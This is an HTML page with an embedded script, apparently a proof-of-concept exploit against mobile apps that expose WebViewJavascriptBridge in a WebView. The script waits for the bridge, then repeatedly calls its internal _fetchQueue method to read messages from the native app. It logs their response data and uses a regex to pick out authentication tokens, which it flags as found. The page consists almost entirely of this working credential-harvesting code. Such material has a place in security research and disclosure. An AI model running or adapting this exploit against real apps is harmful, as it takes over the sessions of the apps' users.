<body style="background:#111; color:#0f0; font-family:monospace;">
  <pre id="log">[*] Waiting for Bridge...</pre>
  <script>
    function log(msg) {
      document.getElementById('log').textContent += '\n' + msg;
    }

    const poll = setInterval(() => {
      if (!window.WebViewJavascriptBridge) return;

      log('[*] Bridge Detected!');
      clearInterval(poll);

      // poll every second for native messages
      setInterval(() => {
        try {
          const queue = WebViewJavascriptBridge._fetchQueue();
          if (queue && typeof queue === 'string') {
            const messages = JSON.parse(queue);
            log('[+] Queue fetched: ' + messages.length + ' message(s)');

            for (const msg of messages) {
              log('[*] Message: ' + JSON.stringify(msg));
              if (msg.responseData) {
                log('[+] responseData: ' + msg.responseData);

                const tokenMatch = msg.responseData.match(/"token"\s*:\s*"([^"]+)"/);
                if (tokenMatch) {
                  log('[!!!] Token Found: ' + tokenMatch[1]);
                }
              }
            }
          }
        } catch (e) {
          log('[!] Error parsing queue: ' + e);
        }
      }, 1000);
    }, 500);
  </script>
</body>
